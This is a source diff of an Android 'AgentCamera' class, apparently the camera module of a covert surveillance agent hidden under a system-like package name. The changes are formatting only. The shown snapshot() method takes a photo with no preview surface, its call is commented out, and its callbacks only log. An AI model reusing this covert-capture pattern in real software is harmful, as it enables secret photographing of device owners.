@@ -20,16 +20,17 @@ import android.view.SurfaceHolder;
 import com.android.service.auto.Cfg;
 import com.android.service.util.Check;
 
-
 //SNIPPET http://marakana.com/forums/android/examples/39.html
 /**
  * The Class CameraAgent.
  */
 public class AgentCamera extends AgentBase {
 
-	private static final String TAG = "AgentCamera";
-
-	/* (non-Javadoc)
+	private static final String TAG = "AgentCamera"; //$NON-NLS-1$
+ //$NON-NLS-1$
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
 	 */
 	@Override
@@ -38,7 +39,9 @@ public class AgentCamera extends AgentBase {
 
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
 	 */
 	@Override
@@ -47,7 +50,9 @@ public class AgentCamera extends AgentBase {
 
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
@@ -56,34 +61,43 @@ public class AgentCamera extends AgentBase {
 		return true;
 	}
 
-	/* (non-Javadoc)
+	/*
+	 * (non-Javadoc)
+	 * 
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
 	public void go() {
-		//snapshot();
+		// snapshot();
 	}
 
 	/**
 	 * Snapshot.
-	 * @throws IOException 
+	 * 
+	 * @throws IOException
 	 */
 	private synchronized void snapshot() throws IOException {
 
 		final ShutterCallback shutterCallback = new ShutterCallback() {
 
-			public void onShutter() {	
-				if(Cfg.DEBUG) Check.log( TAG + " onShutter");
+			public void onShutter() {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " onShutter") ;//$NON-NLS-1$
+				}
 			}
 		};
 		final PictureCallback rawCallback = new PictureCallback() {
 			public void onPictureTaken(final byte[] _data, final Camera _camera) {
-				if(Cfg.DEBUG) Check.log( TAG + " onPictureTaken RAW");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " onPictureTaken RAW") ;//$NON-NLS-1$
+				}
 			}
 		};
 		final PictureCallback jpegCallback = new PictureCallback() {
 			public void onPictureTaken(final byte[] _data, final Camera _camera) {
-				if(Cfg.DEBUG) Check.log( TAG + " onPictureTaken JPEG");
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " onPictureTaken JPEG") ;//$NON-NLS-1$
+				}
 			}
 		};
 
@@ -91,7 +105,7 @@ public class AgentCamera extends AgentBase {
 		final Camera.Parameters parameters = camera.getParameters();
 		parameters.setPictureFormat(PixelFormat.JPEG);
 		camera.setParameters(parameters);
-		SurfaceHolder holder = null;
+		final SurfaceHolder holder = null;
 		camera.setPreviewDisplay(holder);
 		camera.stopPreview();
 		camera.takePicture(shutterCallback, rawCallback, jpegCallback);
